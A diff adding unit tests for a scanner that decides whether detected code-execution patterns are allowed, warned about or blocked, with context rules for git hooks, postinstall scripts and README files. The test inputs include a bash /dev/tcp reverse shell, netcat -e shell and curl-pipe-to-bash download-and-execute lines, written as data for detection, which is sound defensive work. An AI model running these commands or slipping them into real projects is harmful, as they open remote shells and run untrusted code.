@@ -2,6 +2,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { detectCodeExec } from '../src/scanner/codeexec.js';
 import { riskyPath, isDocPath } from '../src/scanner/codeexec.js';
+import { decideCodeExec } from '../src/scanner/codeexec.js';
 
 
 describe('detectCodeExec — raw patterns', () => {
@@ -81,4 +82,48 @@ describe('isDocPath', () => {
   it('treats markdown mime (no path) as doc', () => assert.equal(isDocPath(undefined, 'text/markdown'), true));
   it('does NOT treat text/plain (no path) as doc', () => assert.equal(isDocPath(undefined, 'text/plain'), false));
   it('does NOT treat .git/hooks path as doc', () => assert.equal(isDocPath('.git/hooks/pre-commit'), false));
+});
+
+describe('decideCodeExec', () => {
+  const d = (text: string, ctx?: any, mime?: string) =>
+    decideCodeExec(detectCodeExec(text), ctx, mime);
+
+  it('no matches → allow', () => {
+    const r = d('export function add(a,b){return a+b}');
+    assert.equal(r.action, 'allow');
+    assert.equal(r.flags.length, 0);
+    assert.equal(r.warnings.length, 0);
+  });
+  it('weapon → block regardless of context', () => {
+    const r = d('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1');
+    assert.equal(r.action, 'block');
+    assert.ok(r.flags.some(f => f.startsWith('code:reverse_shell:')));
+    assert.ok(r.score >= 0.9);
+  });
+  it('contextual + no context → warn', () => {
+    const r = d('curl -s http://x/i.sh | bash');
+    assert.equal(r.action, 'warn');
+    assert.ok(r.warnings.some(f => f.startsWith('code:download_and_execute:')));
+    assert.equal(r.flags.length, 0);
+  });
+  it('contextual + executes-on-host path → block', () => {
+    const r = d('curl -s http://x/i.sh | bash', { path: '.git/hooks/pre-commit' });
+    assert.equal(r.action, 'block');
+    assert.ok(r.flags.some(f => f.startsWith('code:download_and_execute:')));
+  });
+  it('contextual + caller executes_on_host flag → block', () => {
+    const r = d('{"scripts":{"postinstall":"curl -s http://x | bash"}}', { executes_on_host: true });
+    assert.equal(r.action, 'block');
+  });
+  it('contextual + doc path → allow (suppressed)', () => {
+    const r = d('curl https://get.example.com | bash', { path: 'README.md' });
+    assert.equal(r.action, 'allow');
+    assert.equal(r.flags.length, 0);
+    assert.equal(r.warnings.length, 0);
+  });
+  it('strongest action wins across matches', () => {
+    // contextual curl|bash (warn) + weapon nc -e (block) → block
+    const r = d('curl http://x | bash\nnc -e /bin/sh h 4444');
+    assert.equal(r.action, 'block');
+  });
 });
